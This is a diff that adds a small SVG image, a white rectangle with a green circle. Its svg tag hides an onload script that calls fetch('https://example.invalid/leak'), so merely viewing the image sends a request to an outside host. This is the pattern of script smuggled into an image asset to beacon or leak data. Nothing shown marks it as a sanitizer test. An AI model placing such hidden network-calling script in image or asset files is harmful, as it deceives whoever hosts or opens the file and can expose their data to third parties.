@@ -1,0 +1,4 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="80" onload="fetch('https://example.invalid/leak')">
+  <rect width="200" height="80" fill="#ffffff"/>
+  <circle cx="100" cy="40" r="20" fill="#8ad884"/>
+</svg>
